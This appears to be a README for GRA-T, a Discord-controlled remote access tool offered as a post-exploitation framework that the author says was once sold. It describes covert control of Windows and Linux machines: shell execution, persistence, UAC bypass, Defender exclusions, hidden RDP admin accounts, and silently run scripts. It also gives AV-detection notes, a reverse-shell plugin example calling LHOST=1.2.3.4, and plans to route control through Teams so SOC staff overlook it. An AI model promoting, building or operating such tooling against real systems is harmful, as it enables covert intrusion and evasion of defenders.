# 🐐 GRA-T – Goatesque Remote Administration Tool

**GRA-T** is a modular, Discord-integrated post-exploitation framework for **red team operators, security researchers, and controlled lab environments**. It provides a stable, plugin-extensible platform for system control, post-exploitation automation, and operational security testing.

---

## ⚙️ Overview

| Field | Detail |
|---|---|
| **Type** | Post-exploitation framework |
| **Interface** | Discord (slash commands) |
| **Plugin Support** | `.grataddin` (custom, plaintext) modular system |
| **Platform** | Windows ✅ | Linux ⚠️ (partial support) |
| **Developer** | [@MohaCHarr](https://github.com/MohaCHarr) |
| **Detection** | Fat, Plugin system are easily flagged by AVs, Vanilla GRA-T is invisible to most |
| **AV Bypass** | Limited (Windows Defender exclusion by an undetected dropper) |

---

## 🎯 Capabilities

- Execute native shell commands (`cmd`, `powershell`, `bash`)
- Upload/download files via Discord
- Maintain (basic) persistence on Windows and Linux
- Establish RDP sessions with automated user creation
- Attempt privilege escalation via UAC bypass
- Execute scripts from GitHub silently
- Capture and deliver screenshots
- Text-to-speech (idk why i put that in, it could be useful one day)
- Plugin system for modular post-exploitation workflows

---

## 📦 Versions

GRA-T is available in **three versions:**

1️⃣ **Plugin-Only Mode**  
Provides only the `.grataddin` system for executing modular post-exploitation scripts with Discord control.
-> Pros : Plugins permit to do many operations automatically and offer an opportunity to automate your tasks by making a plugin for each of your daily actions
-> Cons : Triggers AVs due to how plugins are ran.
> Note : I'm working on a less "plaintext" version of the plugin system, notable changes will be that you will have the choice on how to run the plugin, depending on the plugin's language and platform. The plugins were stored in plaintext and were easy to find but now ill encrypt them so theyre less obvious. Since i'm not good at cryptography i'd REALLY appreciate some help.

2️⃣ **Vanilla GRA-T**  
Core post-exploitation capabilities without the plugin system. Lightweight, stable, and cross-platform.
-> Pros : All you need to transfer, download, run and delete scripts, easy process management trought legit APIs 
-> Cons : Some APIs are limited and don't permit over 10MB uploads | Workaround : Use powershell to download from a non suspicious source OR buy discord nitro (not recommended) 

3️⃣ **GRA-T Fat Version**  
Includes **all vanilla functionalities** and the **plugin system** for a complete post-exploitation framework in a single tool.
-> Pros : All in one
-> Cons : Very easily triggers av due to how the plugin system works (obvious powershell -nop etc... / exessive LOLBAS use)

| Command           | Vanilla | Plugin-Only | GRA-T Fat |
| ----------------- | :-----: | :---------: | :-------: |
| `/run`            |    ✅    |      ❌      |     ✅     |
| `/runcmd`         |    ✅    |      ❌      |     ✅     |
| `/runsh`          |    ✅    |      ❌      |     ✅     |
| `/runpwsh`        |    ✅    |      ❌      |     ✅     |
| `/upload`         |    ✅    |      ❌      |     ✅     |
| `/download`       |    ✅    |      ❌      |     ✅     |
| `/cd`             |    ✅    |      ❌      |     ✅     |
| `/ls`             |    ✅    |      ❌      |     ✅     |
| `/find`           |    ✅    |      ❌      |     ✅     |
| `/systeminfo`     |    ✅    |      ❌      |     ✅     |
| `/ip`             |    ✅    |      ❌      |     ✅     |
| `/setup_rdp`      |    ✅    |      ❌      |     ✅     |
| `/exclude`        |    ✅    |      ❌      |     ✅     |
| `/uac`            |    ✅    |      ❌      |     ✅     |
| `/unpersist`      |    ✅    |      ❌      |     ✅     |
| `/tts`            |    ✅    |      ❌      |     ✅     |
| `/plugin import`  |    ❌    |      ✅      |     ✅     |
| `/plugin list`    |    ❌    |      ✅      |     ✅     |
| `/plugin info`    |    ❌    |      ✅      |     ✅     |
| `/plugin use`     |    ❌    |      ✅      |     ✅     |
| `/plugin stop`    |    ❌    |      ✅      |     ✅     |
| `/plugin stopall` |    ❌    |      ✅      |     ✅     |
| `/plugin delete`  |    ❌    |      ✅      |     ✅     |
| `/plugin sethook` |    ❌    |      ✅      |     ✅     |


---

## 📜 Core Commands

| Command | Description |
|---|---|
| `/run` | Execute native OS shell commands |
| `/runcmd` | Run CMD commands (Windows) |
| `/runsh` | Execute Bash scripts (Linux) |
| `/runpwsh` | Execute PowerShell scripts |
| `/upload` | Upload files to the target |
| `/download` | Download files from the target |
| `/cd`, `/ls`, `/find` | Directory navigation & file search |
| `/systeminfo` | Gather OS information and screenshots |
| `/ip` | Retrieve public IP address |
| `/setup_rdp` | Enable RDP and create an admin user |
| `/exclude` | Add Defender AV exclusion for a folder |
| `/uac` | Attempt privilege escalation |
| `/unpersist` | Remove persistence and clean traces |
| `/tts` | Text-to-speech execution |

---

## 🧩 Plugin System (`.grataddin`)

The `.grataddin` plugin system allows for **clean, scalable extension** of GRA-T’s capabilities:

### Plugin Header Format:
```plaintext
# plugin.name: ReverseShell
# plugin.description: Powershell reverse shell
# plugin.lang: powershell
# plugin.ositworkswith: windows
# plugin.commands: /plugin use ReverseShell LHOST=1.2.3.4 LPORT=4444
# plugin.args: LHOST:str LPORT:int

[plugin logic in {plugin.lang} here !]
````

The body of the plugin contains the script logic in the specified language. 

### Supported Languages:

* Python
* PowerShell
* Batch (cmd)
* Bash

### Plugin Environment:

* CLI arguments passed automatically
* Webhook available via `GRA_T_PLUGIN_WEBHOOK` for output

### Plugin Commands:

| Command                 | Description                            |
| ----------------------- | -------------------------------------- |
| `/plugin_import`        | Import and register `.grataddin` files |
| `/plugin_list`          | List all registered plugins            |
| `/plugin_info [name]`   | Show plugin metadata                   |
| `/plugin_use [name]`    | Execute a plugin with arguments        |
| `/plugin_stop [name]`   | Stop a plugin process                  |
| `/plugin_stopall`       | Terminate all plugin processes         |
| `/plugin_delete [name]` | Remove plugin from disk                |
| `/plugin_sethook [url]` | Set webhook for plugin output          |

---

## 🔐 Security Model

* Uses Discord permission model for access control
* Manual plugin execution
* No unsolicited beaconing or autoruns
* Per-user scoped webhooks
* Execution tracked using PID management

---

## 💻 Architecture

| Component            | Tech Stack                                     |
| -------------------- | ---------------------------------------------- |
| **Bot Core**         | Python 3, discord.py, asyncio                  |
| **Plugin Execution** | subprocess, native interpreters                |
| **Persistence**      | Windows startup folder, Linux `.desktop` files |
| **Screenshots**      | pyautogui                                      |
| **Networking**       | requests, urllib                               |
| **File Management**  | os, shutil                                     |

---

## ✅ Platform Support

| Feature         | Windows | Linux |
| --------------- | :-----: | :---: |
| Shell execution |    ✅    |   ✅   |
| RDP setup       |    ✅    |   ❌   |
| AV exclusion    |    ✅    |   ❌   |
| Persistence     |    ✅    |   ✅   |
| Screenshot      |    ✅    |   ✅   |
| Plugin system   |    ✅    |   ✅   |

---

## ⚠️ Limitations

* No encrypted communication channel (Discord is plaintext)
* No sandbox/VM detection
* No automatic lateral movement or scanning
* Webhooks must be set before plugin upload for output tracking
* Manual plugin review recommended

---

## ⚖️ Usage Policy

GRA-T is intended **strictly for:**

* Red team post-exploitation in authorized environments
* Controlled laboratory testing
* Learning and research in offensive security

> **The user is fully responsible for the tool’s usage.**

---

## 🔗 Contact

Developed and maintained by [@MohaCHarr](https://github.com/MohaCHarr) on [Discord](https://discordlookup.com/user/1389800023130116126), [Twitter](https://twitter.com/MohaCHarr), and GitHub.

---

## 🪐 Future Directions

* Encrypted channel support
* Plugin signing and verification
* Automated recon modules
* Cross-platform improvements
* VM and sandbox detection
* Payload encryption options
* Use of other legitimate APIs to control the bot :


-> Discord ✅, Microsoft Teams 🔁, Slack ❌, Telegram ❌, WhatsApp ❌

--> Here MS Teams and Slack are priority targets since it's widespread in corporate contexts and traffic to the Teams API has high chances to be overlooked by SOC Operators.

---

### Contributing

Contributions for **plugin modules**, **feature improvements**, and **platform support testing** are welcome. Please open issues or pull requests as appropriate.

---

## 🐐 Stay Goated
> Obvious Disclaimer : I made the tool, it is still not very reliable, help and contributions are encouraged, especially if you want to make plugins or to improve the plugin system.
> Note : I used to sell this tool when i lacked money but now i don't have a reason to make it paid anymore so here it is ! Please don't download plugins from somewhere else than this repo that you didn't verify, they may be backdoored. Always verify everything :D
